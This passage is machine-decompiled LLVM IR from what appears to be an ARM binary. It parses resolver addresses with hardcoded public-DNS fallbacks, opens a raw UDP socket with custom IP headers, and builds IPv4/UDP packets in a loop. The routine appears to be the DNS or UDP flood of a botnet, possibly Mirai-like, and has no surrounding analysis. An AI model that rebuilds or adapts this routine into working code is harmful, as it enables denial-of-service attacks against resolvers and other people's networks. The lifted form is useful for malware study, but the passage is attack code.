  store i32 %v2_aae4, i32* %r1.global-to-local, align 4
  store i32 %v0_aad8, i32* %r0.global-to-local, align 4
  %v4_aaf4 = call i32 @function_11cb8(i32 %v0_aad8, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_aaf4, i32* @r5, align 4
  %v0_aafc = load i32, i32* @r4, align 4
  store i32 %v0_aafc, i32* %r0.global-to-local, align 4
  %v1_ab00 = call i32 @function_11af0(i32 %v0_aafc)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_ab08 = call i32 @function_10c20(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_ab14 = call i32 @function_10b3c(i32 22, i32* null)
  %v0_ab18 = load i32, i32* @r5, align 4
  store i32 %v0_ab18, i32* @r1, align 4
  store i32 %v3_ab14, i32* %r2.global-to-local, align 4
  store i32 %v2_aae4, i32* %r0.global-to-local, align 4
  %v3_ab24 = bitcast i32* %stack_var_-2120 to i8*
  %v4_ab24 = call i32 @function_11540(i8* %v3_ab24, i32 %v0_ab18, i32 %v3_ab14)
  store i32 %v4_ab24, i32* @r4, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_ab30 = call i32 @function_10b68(i32 22)
  store i32 %v1_ab30, i32* %r0.global-to-local, align 4
  %v0_ab34 = load i32, i32* @r4, align 4
  %v7_ab34 = icmp eq i32 %v0_ab34, -1
  store i1 %v7_ab34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ab34, label %dec_label_pc_b0a4, label %dec_label_pc_ab3c

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_aae0
  %v0_ab3c = load i32, i32* @r5, align 4
  %v9_ab3c = icmp eq i32 %v0_ab3c, %v0_ab34
  store i1 %v9_ab3c, i1* %cpsr_z.global-to-local, align 1
  %v7_ab40 = icmp sgt i32 %v0_ab3c, %v0_ab34
  br i1 %v7_ab40, label %dec_label_pc_ab44, label %dec_label_pc_b0a4

dec_label_pc_ab44:                                ; preds = %dec_label_pc_ab3c
  store i32 %v0_ab3c, i32* %r3.global-to-local, align 4
  store i32 %v0_ab34, i32* %r2.global-to-local, align 4
  %v0_ab54 = load i32, i32* @r6, align 4
  %v2_ab54 = add i32 %v0_ab54, %v0_ab34
  store i32 %v2_ab54, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_ab5c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ab5c, i32* @r7, align 4
  %v1_ab8c = add i32 %v0_ab3c, -1
  br label %dec_label_pc_ab84

dec_label_pc_ab68:                                ; preds = %dec_label_pc_abac, %bb138
  %v9_ab68 = icmp eq i32 %v0_ab74, %v1_ab8c
  store i1 %v9_ab68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ab68, label %dec_label_pc_abb8, label %dec_label_pc_ab70

dec_label_pc_ab70:                                ; preds = %dec_label_pc_ab9c, %dec_label_pc_ab68, %bb
  %v0_aba842 = phi i32 [ %v0_aba8, %dec_label_pc_ab9c ], [ %v0_aba843, %dec_label_pc_ab68 ], [ %v0_aba8, %bb ]
  %v0_ab8838 = phi i32 [ 0, %dec_label_pc_ab9c ], [ %v0_ab8839, %dec_label_pc_ab68 ], [ 0, %bb ]
  store i32 %v0_ab3c, i32* %r0.global-to-local, align 4
  %v1_ab74 = add i32 %v0_ab74, 1
  store i32 %v1_ab74, i32* %r2.global-to-local, align 4
  %v9_ab78 = icmp eq i32 %v0_ab3c, %v1_ab74
  store i1 %v9_ab78, i1* %cpsr_z.global-to-local, align 1
  %v1_ab7c = add i32 %v0_ab7c, 1
  store i32 %v1_ab7c, i32* @r7, align 4
  br i1 %v9_ab78, label %dec_label_pc_b0a4, label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %dec_label_pc_ab70, %dec_label_pc_ab44
  %v0_ab7c = phi i32 [ %v1_ab7c, %dec_label_pc_ab70 ], [ %v2_ab5c, %dec_label_pc_ab44 ]
  %v0_ab74 = phi i32 [ %v1_ab74, %dec_label_pc_ab70 ], [ %v0_ab34, %dec_label_pc_ab44 ]
  %v0_aba8 = phi i32 [ %v0_aba842, %dec_label_pc_ab70 ], [ 0, %dec_label_pc_ab44 ]
  %v0_ab88 = phi i32 [ %v0_ab8838, %dec_label_pc_ab70 ], [ 0, %dec_label_pc_ab44 ]
  %v0_ab90 = phi i32 [ %v1_ab90, %dec_label_pc_ab70 ], [ %v2_ab54, %dec_label_pc_ab44 ]
  %v1_ab84 = inttoptr i32 %v0_ab90 to i8*
  %v2_ab84 = load i8, i8* %v1_ab84, align 1
  %v3_ab84 = zext i8 %v2_ab84 to i32
  store i32 %v3_ab84, i32* %r3.global-to-local, align 4
  %v2_ab88 = icmp eq i32 %v0_ab88, 0
  store i1 %v2_ab88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ab8c, i32* %ip.global-to-local, align 4
  %v1_ab90 = add i32 %v0_ab90, 1
  store i32 %v1_ab90, i32* %r1.global-to-local, align 4
  %v1_ab94 = add nsw i32 %v3_ab84, -48
  store i32 %v1_ab94, i32* %r0.global-to-local, align 4
  br i1 %v2_ab88, label %dec_label_pc_ab9c, label %dec_label_pc_abac

dec_label_pc_ab9c:                                ; preds = %dec_label_pc_ab84
  %v7_ab9c = icmp eq i8 %v2_ab84, 9
  store i1 %v7_ab9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ab9c, label %dec_label_pc_ab70, label %bb

bb:                                               ; preds = %dec_label_pc_ab9c
  %v8_aba0 = icmp eq i8 %v2_ab84, 32
  store i1 %v8_aba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_aba0, label %dec_label_pc_ab70, label %dec_label_pc_aba8

dec_label_pc_aba8:                                ; preds = %bb
  %v1_aba8 = add i32 %v0_aba8, 1
  store i32 %v1_aba8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_abac

dec_label_pc_abac:                                ; preds = %dec_label_pc_ab84, %dec_label_pc_aba8
  %v0_aba843 = phi i32 [ %v0_aba8, %dec_label_pc_ab84 ], [ %v1_aba8, %dec_label_pc_aba8 ]
  %v0_ab8839 = phi i32 [ %v0_ab88, %dec_label_pc_ab84 ], [ %v1_aba8, %dec_label_pc_aba8 ]
  %v7_abac = icmp eq i8 %v2_ab84, 46
  store i1 %v7_abac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_abac, label %dec_label_pc_ab68, label %bb138

bb138:                                            ; preds = %dec_label_pc_abac
  %v8_abb0 = icmp eq i32 %v1_ab94, 9
  store i1 %v8_abb0, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_ab94, 10
  br i1 %tmp, label %dec_label_pc_ab68, label %dec_label_pc_abb8

dec_label_pc_abb8:                                ; preds = %dec_label_pc_ab68, %bb138
  %v0_ab74.lcssa = phi i32 [ %v1_ab8c, %dec_label_pc_ab68 ], [ %v0_ab74, %bb138 ]
  %v2_abbc = sub i32 %v0_ab74.lcssa, %v0_ab34
  store i32 %v2_abbc, i32* %r2.global-to-local, align 4
  store i32 %v2_ab54, i32* %r1.global-to-local, align 4
  store i32 %v2_ab5c, i32* %r0.global-to-local, align 4
  %v3_abc8 = call i32 @function_11268(i32 %v2_ab5c, i32 %v2_ab54, i32 %v2_abbc)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ab5c, i32* @r0, align 4
  %v2_abd8 = load i32, i32* @r7, align 4
  %v3_abd8 = inttoptr i32 %v2_abd8 to i8*
  store i8 0, i8* %v3_abd8, align 1
  %v1_abdc = call i32 @function_121ec(i32 %v2_ab5c)
  store i32 %v1_abdc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_abe4

dec_label_pc_abe420:                              ; preds = %dec_label_pc_b0a4
  unreachable

dec_label_pc_abe4:                                ; preds = %dec_label_pc_b11c, %dec_label_pc_b10c, %dec_label_pc_b100, %dec_label_pc_b0ec, %dec_label_pc_abb8
  %v29_b0e874 = phi i32 [ %v1_b0a8, %dec_label_pc_b11c ], [ %v1_b0a8, %dec_label_pc_b10c ], [ %v1_b0a8, %dec_label_pc_b100 ], [ %v1_b0a8, %dec_label_pc_b0ec ], [ %v1_abdc, %dec_label_pc_abb8 ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_b11c ], [ 104859200, %dec_label_pc_b10c ], [ 707416650, %dec_label_pc_b100 ], [ 134744072, %dec_label_pc_b0ec ], [ %v1_abdc, %dec_label_pc_abb8 ]
  store i32 %v5_aaa8, i32* %ip.global-to-local, align 4
  %v2_abe8 = icmp eq i32 %v5_aaa8, 0
  store i1 %v2_abe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_abe8, label %dec_label_pc_b0e0, label %dec_label_pc_abf0

dec_label_pc_abf0:                                ; preds = %dec_label_pc_abe4
  store i32 %v5_aaa8, i32* %r0.global-to-local, align 4
  %v1_abf4 = inttoptr i32 %v5_aaa8 to i8*
  %v2_abf4 = call i32 @function_111ec(i8* %v1_abf4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_ac08 = call i32 @function_123e0(i32 2, i32 3, i32 17)
  store i32 %v3_ac08, i32* %r0.global-to-local, align 4
  %v7_ac0c = icmp eq i32 %v3_ac08, -1
  store i1 %v7_ac0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ac0c, label %dec_label_pc_b0e0, label %dec_label_pc_ac18

dec_label_pc_ac18:                                ; preds = %dec_label_pc_abf0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_ac24 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_ac24, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_ac38 = call i32 @function_123b0(i32 %v3_ac08, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_ac38, i32* %r0.global-to-local, align 4
  %v7_ac3c = icmp eq i32 %v6_ac38, -1
  store i1 %v7_ac3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ac3c, label %dec_label_pc_b0d8, label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %dec_label_pc_ac18
  store i32 %v1_a994, i32* %r0.global-to-local, align 4
  %v3_ac4c = mul i32 %v7_a9e8, 65536
  store i32 %v3_ac4c, i32* %lr.global-to-local, align 4
  %v0_ac50 = load i32, i32* @sl, align 4
  %v3_ac50 = mul i32 %v0_ac50, 65536
  store i32 %v3_ac50, i32* %sl.global-to-local, align 4
  %v0_ac54 = load i32, i32* %r8.global-to-local, align 4
  %v0_ac58 = load i32, i32* %fp.global-to-local, align 4
  %v0_ac5c = load i32, i32* %sb.global-to-local, align 4
  %v3_ac5c = mul i32 %v0_ac5c, 65536
  store i32 %v3_ac5c, i32* %sb.global-to-local, align 4
  %v5_ac60 = trunc i32 %v0_ac54 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ac68 = urem i32 %v7_a9e8, 65536
  store i32 %v3_ac68, i32* %r2.global-to-local, align 4
  %v3_ac6c = urem i32 %v0_ac58, 65536
  store i32 %v3_ac6c, i32* %r3.global-to-local, align 4
  %v3_ac70 = urem i32 %v0_ac5c, 65536
  store i32 %v3_ac70, i32* %r4.global-to-local, align 4
  %v3_ac74 = urem i32 %v0_ac50, 65536
  store i32 %v3_ac74, i32* %r8.global-to-local, align 4
  %v2_ac78 = icmp eq i32 %v1_a994, 0
  store i1 %v2_ac78, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_ac78, label %dec_label_pc_b0c8, label %dec_label_pc_ac9c

dec_label_pc_ac9c:                                ; preds = %dec_label_pc_ac44
  %v4_aca0 = sext i8 %v5_ac60 to i32
  %v2_aca4 = add i32 %v4_aca0, %v2_abf4
  store i32 %v2_aca4, i32* @fp, align 4
  %v3_aca8 = mul i32 %v2_aca4, 65536
  %v1_acac = add i32 %v3_aca8, 1769472
  store i32 %v1_acac, i32* @r6, align 4
  %v1_acb0 = add i32 %v3_aca8, 3080192
  %v1_acc4 = urem i32 %v0_ac50, 256
  %v3_acd4 = udiv i32 %v1_acac, 256
  %v1_acd8 = urem i32 %v7_a9e8, 256
  %v1_acdc = and i32 %v3_acd4, 65280
  %v1_ace0 = urem i32 %v0_ac5c, 256
  %v3_ace4 = mul nuw nsw i32 %v1_acc4, 256
  %v1_acec = urem i32 %v0_ac58, 256
  %v3_acf0 = mul nuw nsw i32 %v1_ace0, 256
  %tmp139 = udiv i32 %v0_ac50, 256
  %v4_acf4 = urem i32 %tmp139, 256
  %v5_acf4 = or i32 %v4_acf4, %v3_ace4
  store i32 %v5_acf4, i32* %r8.global-to-local, align 4
  %v4_acf8 = udiv i32 %v1_acac, 16777216
  %v5_acf8 = or i32 %v1_acdc, %v4_acf8
  store i32 %v5_acf8, i32* %sl.global-to-local, align 4
  %tmp140 = udiv i32 %v0_ac58, 256
  %v3_ad04 = urem i32 %tmp140, 256
  %v4_ad08 = sdiv i32 %v1_acb0, 16777216
  %tmp141 = udiv i32 %v7_a9e8, 256
  %v4_ad10 = mul nuw nsw i32 %v1_acec, 256
  %v5_ad10 = or i32 %v4_ad10, %v3_ad04
  store i32 %v5_ad10, i32* @r5, align 4
  %tmp142 = udiv i32 %v0_ac5c, 256
  %v4_ad14 = urem i32 %tmp142, 256
  %v5_ad14 = or i32 %v4_ad14, %v3_acf0
  store i32 %v5_ad14, i32* %sb.global-to-local, align 4
  store i32 %v1_acd8, i32* %r0.global-to-local, align 4
  %v1_ad20 = add i32 %v2_abf4, 1
  store i32 %v1_ad20, i32* @r7, align 4
  %v3_ad24 = ashr i32 %v1_acb0, 31
  store i32 %v3_ad24, i32* @lr, align 4
  store i32 %v1_acec, i32* %r1.global-to-local, align 4
  store i32 %v1_ace0, i32* %r2.global-to-local, align 4
  %v3_ad3075 = udiv i32 %v1_acdc, 256
  store i32 %v3_ad3075, i32* %r3.global-to-local, align 4
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ad94 = sext i8 %v5_a9e4 to i32
  %sext13 = mul i32 %v6_aa00, 16777216
  %v4_adac = sdiv i32 %sext13, 16777216
  %sext14 = mul i32 %tmp141, 16777216
  %v4_adc0 = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %v7_a9e8, 16777216
  %v4_adc4 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v1_acac, 256
  %v4_adf4 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_ac5c, 16777216
  %v4_adf8 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_ac58, 16777216
  %v4_ae1c = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_ac50, 16777216
  %v4_ae28 = sdiv i32 %sext19, 16777216
  %v1_ada4 = trunc i32 %v4_ad08 to i8
  %extract.t = trunc i32 %v3_ad24 to i8
  br label %dec_label_pc_ad54

dec_label_pc_ad54:                                ; preds = %dec_label_pc_aebc, %dec_label_pc_ac9c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_ad5c = call i32 @function_126cc(i32 600, i32 1)
  store i32 %v2_ad5c, i32* %r0.global-to-local, align 4
  store i32 %v2_a9ac, i32* %lr.global-to-local, align 4
  %v3_ad64 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ad64, i32* %r3.global-to-local, align 4
  %v2_ad68 = load i32, i32* @r4, align 4
  %v5_ad68 = mul i32 %v2_ad68, 4
  %v6_ad68 = add i32 %v5_ad68, %v2_a9ac
  %v7_ad68 = inttoptr i32 %v6_ad68 to i32*
  store i32 %v2_ad5c, i32* %v7_ad68, align 4
  %v0_ad6c = load i32, i32* %lr.global-to-local, align 4
  %v1_ad6c = load i32, i32* %r3.global-to-local, align 4
  %v4_ad6c = mul i32 %v1_ad6c, 4
  %v5_ad6c = add i32 %v4_ad6c, %v0_ad6c
  %v6_ad6c = inttoptr i32 %v5_ad6c to i32*
  %v7_ad6c = load i32, i32* %v6_ad6c, align 4
  store i32 %v7_ad6c, i32* %r1.global-to-local, align 4
  %v1_ad70 = inttoptr i32 %v7_ad6c to i8*
  %v2_ad70 = load i8, i8* %v1_ad70, align 1
  %tmp154 = urem i8 %v2_ad70, 16
  %v1_ad74 = zext i8 %tmp154 to i32
  %v1_ad78 = or i32 %v1_ad74, 64
  store i32 %v1_ad78, i32* %r2.global-to-local, align 4
  %v1_ad7c = trunc i32 %v1_ad78 to i8
  store i8 %v1_ad7c, i8* %v1_ad70, align 1
  %v0_ad80 = load i32, i32* %r1.global-to-local, align 4
  %v1_ad80 = inttoptr i32 %v0_ad80 to i8*
  %v2_ad80 = load i8, i8* %v1_ad80, align 1
  %v1_ad84 = and i8 %v2_ad80, -16
  %v1_ad88 = or i8 %v1_ad84, 5
  store i32 %v1_aa2c, i32* %r0.global-to-local, align 4
  store i8 %v1_ad88, i8* %v1_ad80, align 1
  store i32 %v4_ad94, i32* %r2.global-to-local, align 4
  %v2_ad98 = load i32, i32* %r1.global-to-local, align 4
  %v3_ad98 = add i32 %v2_ad98, 1
  %v4_ad98 = inttoptr i32 %v3_ad98 to i8*
  store i8 %v5_a9e4, i8* %v4_ad98, align 1
  store i32 %v4_ad08, i32* %r3.global-to-local, align 4
  %v0_ada0 = load i32, i32* %r0.global-to-local, align 4
  %v2_ada0 = icmp eq i32 %v0_ada0, 0
  store i1 %v2_ada0, i1* %cpsr_z.global-to-local, align 1
  %v2_ada4 = load i32, i32* %r1.global-to-local, align 4
  %v3_ada4 = add i32 %v2_ada4, 2
  %v4_ada4 = inttoptr i32 %v3_ada4 to i8*
  store i8 %v1_ada4, i8* %v4_ada4, align 1
  store i32 %v3_ad24, i32* %r4.global-to-local, align 4
  store i32 %v4_adac, i32* %r0.global-to-local, align 4
  %v0_adb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_adb0, label %.thread21, label %bb143

bb143:                                            ; preds = %dec_label_pc_ad54
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_adb4 = load i32, i32* %r1.global-to-local, align 4
  %v4_adb4 = add i32 %v3_adb4, 6
  %v5_adb4 = inttoptr i32 %v4_adb4 to i8*
  store i8 64, i8* %v5_adb4, align 1
  %v0_adbc.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t76 = trunc i32 %v0_adbc.pre to i8
  br label %.thread21

.thread21:                                        ; preds = %dec_label_pc_ad54, %bb143
  %v0_adbc.off0 = phi i8 [ %extract.t, %dec_label_pc_ad54 ], [ %extract.t76, %bb143 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_adbc = load i32, i32* %r1.global-to-local, align 4
  %v3_adbc = add i32 %v2_adbc, 3
  %v4_adbc = inttoptr i32 %v3_adbc to i8*
  store i8 %v0_adbc.off0, i8* %v4_adbc, align 1
  store i32 %v4_adc0, i32* %ip.global-to-local, align 4
  store i32 %v4_adc4, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cb1c.49 to i32), i32* %r4.global-to-local, align 4
  %v0_adcc = load i32, i32* %r0.global-to-local, align 4
  %v1_adcc = trunc i32 %v0_adcc to i8
  %v2_adcc = load i32, i32* %r1.global-to-local, align 4
  %v3_adcc = add i32 %v2_adcc, 8
  %v4_adcc = inttoptr i32 %v3_adcc to i8*
  store i8 %v1_adcc, i8* %v4_adcc, align 1
  %v0_add0 = load i32, i32* %r3.global-to-local, align 4
  %v1_add0 = trunc i32 %v0_add0 to i8
  %v2_add0 = load i32, i32* %r1.global-to-local, align 4
  %v3_add0 = add i32 %v2_add0, 9
  %v4_add0 = inttoptr i32 %v3_add0 to i8*
  store i8 %v1_add0, i8* %v4_add0, align 1
  %v0_add4 = load i32, i32* %lr.global-to-local, align 4
  %v1_add4 = trunc i32 %v0_add4 to i8
  %v2_add4 = load i32, i32* %r1.global-to-local, align 4
  %v3_add4 = add i32 %v2_add4, 5
  %v4_add4 = inttoptr i32 %v3_add4 to i8*
  store i8 %v1_add4, i8* %v4_add4, align 1
  %v0_add8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_add8, label %.thread22, label %bb144

.thread22:                                        ; preds = %.thread21
  %v2_addc23 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_addc23, i32* %r3.global-to-local, align 4
  store i32 %v4_aca0, i32* %lr.global-to-local, align 4
  br label %bb145

bb144:                                            ; preds = %.thread21
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_addc = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_addc, i32* %r3.global-to-local, align 4
  store i32 %v4_aca0, i32* %lr.global-to-local, align 4
  %v3_ade4 = load i32, i32* %r1.global-to-local, align 4
  %v4_ade4 = add i32 %v3_ade4, 7
  %v5_ade4 = inttoptr i32 %v4_ade4 to i8*
  store i8 0, i8* %v5_ade4, align 1
  %v0_adec.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_adf0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb145

bb145:                                            ; preds = %.thread22, %bb144
  %v0_adf0 = phi i32 [ %v2_addc23, %.thread22 ], [ %v0_adf0.pre, %bb144 ]
  %v0_adec = phi i32 [ %v4_aca0, %.thread22 ], [ %v0_adec.pre, %bb144 ]
  %v0_ade8 = load i32, i32* %r1.global-to-local, align 4
  %v1_ade8 = add i32 %v0_adec, 41
  %v2_adec = add i32 %v1_ade8, %v0_ade8
  store i32 %v2_adec, i32* %r4.global-to-local, align 4
  %v2_adf0 = add i32 %v0_ade8, 12
  %v3_adf0 = inttoptr i32 %v2_adf0 to i32*
  store i32 %v0_adf0, i32* %v3_adf0, align 4
  store i32 %v4_adf4, i32* %r2.global-to-local, align 4
  store i32 %v4_adf8, i32* %r3.global-to-local, align 4
  %v0_adfc = load i32, i32* %r1.global-to-local, align 4
  %v1_adfc = add i32 %v0_adfc, 20
  store i32 %v1_adfc, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* %ip.global-to-local, align 4
  %v1_ae00 = trunc i32 %v0_ae00 to i8
  %v3_ae00 = add i32 %v0_adfc, 4
  %v4_ae00 = inttoptr i32 %v3_ae00 to i8*
  store i8 %v1_ae00, i8* %v4_ae00, align 1
  %v0_ae04 = load i32, i32* %r2.global-to-local, align 4
  %v1_ae04 = trunc i32 %v0_ae04 to i8
  %v2_ae04 = load i32, i32* %r0.global-to-local, align 4
  %v3_ae04 = add i32 %v2_ae04, 5
  %v4_ae04 = inttoptr i32 %v3_ae04 to i8*
  store i8 %v1_ae04, i8* %v4_ae04, align 1
  %v0_ae08 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae08 = trunc i32 %v0_ae08 to i8
  %v2_ae08 = load i32, i32* %r0.global-to-local, align 4
  %v3_ae08 = add i32 %v2_ae08, 3
  %v4_ae08 = inttoptr i32 %v3_ae08 to i8*
  store i8 %v1_ae08, i8* %v4_ae08, align 1
  %v0_ae0c = load i32, i32* %sb.global-to-local, align 4
  %v1_ae0c = trunc i32 %v0_ae0c to i8
  %v2_ae0c = load i32, i32* %r0.global-to-local, align 4
  %v3_ae0c = add i32 %v2_ae0c, 2
  %v4_ae0c = inttoptr i32 %v3_ae0c to i8*
  store i8 %v1_ae0c, i8* %v4_ae0c, align 1
  %v0_ae10 = load i32, i32* %sl.global-to-local, align 4
  %v1_ae10 = trunc i32 %v0_ae10 to i8
  %v2_ae10 = load i32, i32* %r0.global-to-local, align 4
  %v3_ae10 = add i32 %v2_ae10, 4
  %v4_ae10 = inttoptr i32 %v3_ae10 to i8*
  store i8 %v1_ae10, i8* %v4_ae10, align 1
  %v0_ae14 = load i32, i32* @r5, align 4
  %v1_ae14 = trunc i32 %v0_ae14 to i8
  %v2_ae14 = load i32, i32* %r1.global-to-local, align 4
  %v3_ae14 = add i32 %v2_ae14, 20
  %v4_ae14 = inttoptr i32 %v3_ae14 to i8*
  store i8 %v1_ae14, i8* %v4_ae14, align 1
  store i32 %v4_ae1c, i32* %r2.global-to-local, align 4
  %v1_ae20 = load i32, i32* %r1.global-to-local, align 4
  %v2_ae20 = add i32 %v1_ae20, 16
  %v3_ae20 = inttoptr i32 %v2_ae20 to i32*
  store i32 %stack_var_-2176.0, i32* %v3_ae20, align 4
  %v0_ae24 = load i32, i32* %r2.global-to-local, align 4
  %v1_ae24 = trunc i32 %v0_ae24 to i8
  %v2_ae24 = load i32, i32* %r0.global-to-local, align 4
  %v3_ae24 = add i32 %v2_ae24, 1
  %v4_ae24 = inttoptr i32 %v3_ae24 to i8*
  store i8 %v1_ae24, i8* %v4_ae24, align 1
  store i32 %v4_ae28, i32* %lr.global-to-local, align 4
  store i32 %v4_aca0, i32* %r0.global-to-local, align 4
  %v0_ae30 = load i32, i32* %r1.global-to-local, align 4
  %v1_ae30 = add i32 %v0_ae30, 28
  store i32 %v1_ae30, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ae3c = load i32, i32* %r8.global-to-local, align 4
  %v1_ae3c = trunc i32 %v0_ae3c to i8
  %v4_ae3c = inttoptr i32 %v1_ae30 to i8*
  store i8 %v1_ae3c, i8* %v4_ae3c, align 1
  %v0_ae40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae40 = trunc i32 %v0_ae40 to i8
  %v2_ae40 = load i32, i32* %ip.global-to-local, align 4
  %v3_ae40 = add i32 %v2_ae40, 5
  %v4_ae40 = inttoptr i32 %v3_ae40 to i8*
  store i8 %v1_ae40, i8* %v4_ae40, align 1
  %v0_ae44 = load i32, i32* %lr.global-to-local, align 4
  %v1_ae44 = trunc i32 %v0_ae44 to i8
  %v2_ae44 = load i32, i32* %ip.global-to-local, align 4
  %v3_ae44 = add i32 %v2_ae44, 1
  %v4_ae44 = inttoptr i32 %v3_ae44 to i8*
  store i8 %v1_ae44, i8* %v4_ae44, align 1
  %v0_ae48 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae48 = trunc i32 %v0_ae48 to i8
  %v2_ae48 = load i32, i32* %ip.global-to-local, align 4
  %v3_ae48 = add i32 %v2_ae48, 2
  %v4_ae48 = inttoptr i32 %v3_ae48 to i8*
  store i8 %v1_ae48, i8* %v4_ae48, align 1
  %v0_ae4c = load i32, i32* @r6, align 4
  %v1_ae4c = trunc i32 %v0_ae4c to i8
  %v2_ae4c = load i32, i32* %ip.global-to-local, align 4
  %v3_ae4c = add i32 %v2_ae4c, 3
  %v4_ae4c = inttoptr i32 %v3_ae4c to i8*
  store i8 %v1_ae4c, i8* %v4_ae4c, align 1
  %v0_ae50 = load i32, i32* @r6, align 4
  %v1_ae50 = trunc i32 %v0_ae50 to i8
  %v2_ae50 = load i32, i32* %ip.global-to-local, align 4
  %v3_ae50 = add i32 %v2_ae50, 4
  %v4_ae50 = inttoptr i32 %v3_ae50 to i8*
  store i8 %v1_ae50, i8* %v4_ae50, align 1
  %v0_ae54 = load i32, i32* %r0.global-to-local, align 4
  %v1_ae54 = trunc i32 %v0_ae54 to i8
  %v2_ae54 = load i32, i32* %r1.global-to-local, align 4
  %v3_ae54 = add i32 %v2_ae54, 40
  %v4_ae54 = inttoptr i32 %v3_ae54 to i8*
  store i8 %v1_ae54, i8* %v4_ae54, align 1
  store i32 %v5_aaa8, i32* %r1.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r7, align 4
  store i32 %v0_ae5c, i32* %r2.global-to-local, align 4
  %v0_ae60 = load i32, i32* %r4.global-to-local, align 4
  %v1_ae60 = add i32 %v0_ae60, 1
  store i32 %v1_ae60, i32* %r0.global-to-local, align 4
  %v3_ae64 = call i32 @function_11268(i32 %v1_ae60, i32 %v5_aaa8, i32 %v0_ae5c)
  store i32 %v3_ae64, i32* %r0.global-to-local, align 4
  store i32 %v2_abf4, i32* %r1.global-to-local, align 4
  %v1_ae6c = load i32, i32* @r6, align 4
  %v9_ae6c = icmp eq i32 %v2_abf4, %v1_ae6c
  store i1 %v9_ae6c, i1* %cpsr_z.global-to-local, align 1
  %v7_ae70 = icmp sgt i32 %v2_abf4, %v1_ae6c
  store i32 %v1_ae6c, i32* %lr.global-to-local, align 4
  %v0_ae80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ae80, i32* %r2.global-to-local, align 4
  %extract.t78 = trunc i32 %v1_ae6c to i8
  br i1 %v7_ae70, label %dec_label_pc_ae7c, label %dec_label_pc_aebc

dec_label_pc_ae7c:                                ; preds = %bb145
  store i32 %v1_ae6c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ae88

dec_label_pc_ae88:                                ; preds = %bb148, %dec_label_pc_ae7c
  %v0_aea485151 = phi i32 [ %v0_aea485152, %bb148 ], [ %v1_ae6c, %dec_label_pc_ae7c ]
  %v1_ae9833 = phi i32 [ %v1_aea891, %bb148 ], [ %v1_ae6c, %dec_label_pc_ae7c ]
  %v1_ae94.off0 = phi i8 [ %v1_ae9456.off0, %bb148 ], [ %extract.t78, %dec_label_pc_ae7c ]
  %v0_ae9832 = phi i32 [ %v0_ae98325488, %bb148 ], [ %v0_ae80, %dec_label_pc_ae7c ]
  store i32 %v5_aaa8, i32* %ip.global-to-local, align 4
  %v2_ae8c = add i32 %v1_ae9833, %v5_aaa8
  %v3_ae8c = inttoptr i32 %v2_ae8c to i8*
  %v4_ae8c = load i8, i8* %v3_ae8c, align 1
  %v6_ae8c = zext i8 %v4_ae8c to i32
  store i32 %v6_ae8c, i32* %r3.global-to-local, align 4
